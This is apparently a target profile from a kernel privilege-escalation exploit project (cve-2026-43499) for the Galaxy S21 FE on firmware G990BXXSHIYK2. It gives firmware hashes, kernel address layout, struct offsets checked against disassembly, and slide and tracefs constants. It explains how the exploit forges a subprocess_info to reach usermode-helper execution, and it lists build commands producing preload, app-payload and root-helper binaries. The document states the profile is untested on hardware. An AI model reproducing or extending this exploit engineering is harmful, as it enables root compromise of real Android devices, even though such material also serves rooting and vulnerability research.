# SM-G990B — G990BXXSHIYK2 (Galaxy S21 FE 5G, Snapdragon 888, kernel 5.4.289)

Profile `r9q-G990BXXSHIYK2`. First target on the 5.4 branch, and the first
Qualcomm target with the `LEGACY` `rt_mutex_waiter` layout. Status:
**static-analysis and build verified; not device-tested.** No SM-G990B was
available for hardware validation, so every runtime claim below is explicitly
labelled as unconfirmed.

## 1. Identify the exact firmware

```text
model            SM-G990B (also SM-G990B/DS), codename r9q, Qualcomm SM8350
region           EUX (OXM multi-CSC)
AP/PDA           G990BXXSHIYK2
CSC              G990BOXMHIYK2
CP               G990BXXSHIYK1
display build    BP2A.250605.031.A3.G990BXXSHIYK2
kernel release   5.4.289-qgki-32192773-abG990BXXSHIYK2
toolchain        Android clang 11.0.2 (r383902b1), full LTO, CFI, SCS, PTR_AUTH
```

The owner-supplied PDA `G990BXXHIYK2` is missing the bootloader revision letter;
Samsung FUS serves `G990BXXSHIYK2` (8,779,629,139 bytes) as the only match for
this model and CSC, and that is the build the Image in this profile came from.

## 2. Provenance

```text
firmware ZIP        G990BXXSHIYK2_EUX.zip
boot.img            100,663,296 B
                    sha256 2d5e5f6e40662e545721842b86f2637b57460ebaebd15fbbb34b59937b34b0c8
raw kernel Image    52,490,752 B
                    sha256 f4db3b0c675127b025dbb9ef72fed16505e56e364817437b7892098d4bfd17e4
vendor_boot.img     100,663,296 B (DTB source for the physical map)
abl.elf             Qualcomm ABL, 4,194,304 B
OSS source          SM-G990B_16_Opensource.zip, defconfig vendor/r9q_eur_openx_defconfig
```

Boot header: v4, `kernel_size = 0x320f200`. The kernel payload is a **raw ARM64
Image** (not gzip): `ARMd` magic at `0x1000`, `text_offset = 0x80000`,
`image_size = 0x37aa000`, `flags = 0xa`. `CONFIG_IKCONFIG` is present, so the
build config is recoverable from the Image itself; **there is no BTF**
(`CONFIG_DEBUG_INFO_BTF` is not set), which rules out the BTF-driven derivations
used by the 5.10+ records.

## 3. Address layout

```c
#define KIMAGE_TEXT_BASE 0xffffffc010080000ULL   /* vmlinux _text */
#define P0_PAGE_OFFSET   0xffffff8000000000ULL   /* PAGE_OFFSET, VA_BITS=39 */
#define P0_PHYS_OFFSET   0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80080000ULL
#define SKB_DATA_DELTA   (-0xe80LL)
```

`_text` is read from the reconstructed ELF (`_text = 0xffffffc010080000`,
`_stext = _text + 0x1000`, `_etext = 0xffffffc0117d0000`, `.kernel` VMA matches
`_text`), i.e. `KIMAGE_VADDR 0xffffffc010000000 + TEXT_OFFSET 0x80000`, and
`vmlinux.lds.S` asserts exactly that relation.

The physical base comes from the vendor_boot DTB. Its `/memory` node is a
zeroed placeholder that ABL patches at boot, so it cannot be read directly; the
`/reserved-memory` carve-outs do pin the RAM base, since the first two are
`hyp_region@80000000` (`0x80000000 + 0x600000`) and `xbl_aop_region@80700000`
(`0x80700000 + 0x160000`). The Image is placed at `RAM base + text_offset`, so
`P0_KERNEL_PHYS_LOAD = 0x80080000`. This is the same pair the Snapdragon 888
`dm1q` record uses. Note that `abl.elf` here is a 32-bit ARM wrapper, as on
other Qualcomm devices; the load address is not read out of it.

## 4. ABI derivation

There is no BTF on 5.4, so the struct layout was not hand-counted. Instead the
Samsung OSS tree is compiled into an offset probe:

1. `make olddefconfig` against the config extracted from the shipped Image
   regenerates the kernel's real `include/generated/autoconf.h` — including the
   no-prompt symbols that a hand-written conversion of `.config` loses.
2. A probe translation unit includes the real kernel headers (plus verbatim
   copies of the private structs from `kernel/workqueue.c`,
   `include/linux/rt_mutex.h` and `fs/configfs/file.c`) and emits
   `offsetof()`/`sizeof()` values into `.rodata`.
3. It is cross-compiled `--target=aarch64-linux-gnu` with the NDK clang so
   pointer sizes, alignment and `thread_info` geometry match the device, and the
   values are read back out of the object.
4. Every value is then **corroborated against the shipped binary**. Anchors that
   must agree: `mm_cache_init` (`mov w1,#0x398`), the usercopy pair in the same
   call (`w4 = 0x158`, `w5 = 0x170`), `get_mm_exe_file` (`ldr x19,[x19,#0x340]`),
   `mmput_async` (`add x9,x0,#0x360`), `mmput` (`add x8,x0,#0x54`),
   `__put_task_struct` (`ldr w8,[x19,#0x38]`), `task_blocks_on_rt_mutex`
   (`#0x8dc`, `#0x8e8`, `#0x900`), `apply_wqattrs_commit` (`swap(wq->dfl_pwq,
   ctx->dfl_pwq)` → `#0xa0`), `pwq_adjust_max_active` (`#0x100`, `#0x58`,
   `#0x5c`, `#0x60`), and `create_kmalloc_caches` (2-iteration row loop,
   `0x70` row stride, `kmalloc_caches + 0x810`).

The only place the OSS headers disagree with the shipped binary is
`sizeof(struct mm_struct)`: the headers give `0x390`, the kernel's own
`kmem_cache_create_usercopy` argument is `0x398`. The 8 bytes are at the very tail
(after `async_put_work`, which is itself binary-verified at `0x358`), and no
field the payload touches is affected, so `MM_STRUCT_SZ` uses the
kernel-authoritative `0x398`.

Config facts that shape the profile:

```text
MM_STRUCT_SZ 0x398 (kernel)   MM_ORDER 3
sizeof(struct mutex) 0x20     MUTEX_SPIN_ON_OWNER=y, all lock debugging off
LEGACY_RT_MUTEX_WAITER 1      tree_entry/pi_tree_entry/task/lock/prio/deadline
                              = 0x00/0x18/0x30/0x38/0x40/0x48, size 0x50
WORK_NR_COLORS 15             (1 << WORK_STRUCT_COLOR_BITS) - 1, NOT 4 — this is
                              why pool_workqueue.nr_active is 0x58, not 0x2c
kmalloc rows 2                CONFIG_ZONE_DMA unset ⇒ kmalloc_cache_type is
                              {NORMAL 0, RECLAIM 1}; GFP_KERNEL_ACCOUNT selects
                              NORMAL ⇒ KMALLOC_CGROUP_TYPE 0
SLUB, no KASAN/MTE, no freelist randomisation, SHUFFLE_PAGE_ALLOCATOR=y
CONFIG_DEBUG_INFO_BTF not set; KALLSYMS_ALL + BASE_RELATIVE
```

Notable layout differences from the 5.10/6.1 records, i.e. per-target values
that must not be copied from another profile:

```text
CFG_NEEDS_READ_FILL_OFF 0x40   (5.10/6.1 use 0x50)
CFG_BIN_BUFFER_OFF 0x48        (0x58)
CFG_BIN_BUFFER_SIZE_OFF 0x50   (0x60)
CFG_CB_MAX_SIZE_OFF 0x54       (0x64)
WQ_DFL_PWQ_OFF 0xa0            (0xb0)
CONFIGFS_READ_ITER_OFF is configfs_read_file (5.4 name), 0x0058cbb4
```

`STATIC_USERMODEHELPER=y` with `CONFIG_STATIC_USERMODEHELPER_PATH=
"/system/bin/umh/usermode-helper-replica"` is harmless here: the override lives in
`call_usermodehelper_setup()`, and the exploit builds its own `subprocess_info`
and calls `call_usermodehelper_exec_work` directly, so the route never reaches
`call_usermodehelper_exec`. The 5.4 `subprocess_info` adds `struct file *file`
and `pid_t pid` after `envp`, but the shared 112-byte `umh_subprocess_info`
layout only writes fields at/below `envp` and zero-fills the rest, so it still
matches.

## 5. Runtime constants

```c
#define SLIDE_TRACEFS_EVENT_ID 73
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x002a5cb0ULL
```

`__TRACE_LAST_TYPE` is 17 in this 5.4 tree, `register_trace_event()` starts
`next_event_type` at `__TRACE_LAST_TYPE + 1 = 18`, and
`sched_blocked_reason` has zero-based linker registration index
`(__event_sched_blocked_reason - __start_ftrace_events)/8 = 55`, so the runtime
ID is `73`. **Confirm on device** with

```sh
cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id
```

`SLIDE_TRACEFS_WORKER_CALLER_OFF` is the instruction after the blocking
`schedule()` call inside `worker_thread` (`bl` at `+0x2a5cac`, saved PC in the
worker's `thread.sched_context` at `+0x4`).

## 6. `SLIDE_PSELECT_WORD_SHIFT` — the one unresolved constant

```c
#define SLIDE_PSELECT_WORD_SHIFT 0
```

This kernel has the `LEGACY` `rt_mutex_waiter` (10 qwords, indices 0-9) and
`PSELECT_ROUTE_NFDS=320`, so the logical read/write/exception fd-set array is 15
qwords and the constraint is `SHIFT + 9 <= 14` ⇒ `SHIFT <= 5`. Zero is the
`LEGACY` family value used by the only other `LEGACY` profile (`A155N`), where
waiter qword zero overlaps the first qword of the logical fd-set sequence.

It is **not** hardware-confirmed on this build, and the record for
`SM-S926BXXUEDZDR` shows exactly how wrong a statically-derived value can be
(0 selected statically, hardware readback forced 3). Treat 0 as the default to
try first and be prepared to re-derive it from a panic readback the way that
record did.

## 7. P0 fingerprint

`src/targets/r9q-G990BXXSHIYK2/p0_fingerprint.h` is generated from this build's
raw Image, not copied. 32 rows cover slides `0x000000`-`0x1f0000` in `0x10000`
steps; each row reads 8 qwords at page offsets `0x000` ... `0xe00` from image
offset `P0_ORACLE_PROBE_OFFSET - slide`. All 256 qwords were re-read from the
Image and matched after generation. Row 0 word 0 is `0x149c7fff91005a4d`, which
differs from every sibling table, as expected.

## 8. KernelSU

Not listed for this target. KernelSU's supported baseline is the 5.10+ GKI
family, and this is a non-GKI 5.4 `qgki` kernel with no matching `ksud` build in
`kernelsu/` (those are LKM/KDP-adapted GKI binaries). KernelSU would need a real
5.4 backport plus a non-GKI integration before it can be added to the feed; the
exploit itself does not depend on it.

## 9. Build

```sh
make all     TARGET=r9q-G990BXXSHIYK2 ANDROID_NDK_HOME=<ndk>
make release TARGET=r9q-G990BXXSHIYK2 ANDROID_NDK_HOME=<ndk>
```

Produces `build/r9q-G990BXXSHIYK2/`:

```text
cve-2026-43499                    105,808 B  preload
cve-2026-43499-app.so             126,664 B  app payload
cve-2026-43499-app.release.so     104,128 B  released app payload (APP_RELEASE_SIZE)
cve-2026-43499-root                27,072 B  root helper
```

The released artifact is published as
`artifacts/r9q-G990BXXSHIYK2/cve-2026-43499-app.so` (104,128 bytes,
sha256 `e3f396fd3c7d07445b86edef7223aa1d7fe34f234fe3b8aa2f4a33c6c52d1d77`) and
registered in `support/targets-v3.json` under `galaxy-s21-fe-2025-11-28`.

## 10. Validation status

| item | status |
| --- | --- |
| firmware identity, Image header, config recovery | verified from the shipped artifacts |
| every ABI constant in `target.h` | verified against the same Image's disassembly |
| p0 fingerprint table | generated and re-read back, 256/256 qwords |
| profile compiles (all four artifacts) | verified |
| `SLIDE_PSELECT_WORD_SHIFT` | **not** hardware-confirmed |
| tracefs event ID | **not** hardware-confirmed |
| end-to-end root on hardware | **not** performed — no device available |

Nothing in this profile has been run on a phone. Anyone testing it should
expect to confirm the two constants above first, and should not treat a
successful build as evidence that the route works.

## 11. Cleanup policy

Retain the raw `kernel` file and this record's provenance hashes; drop the
downloaded firmware ZIP, the AP/BL archives, the boot and vendor_boot images, the
recovered ELF and the temporary BTF/offset dumps once the profile is final.
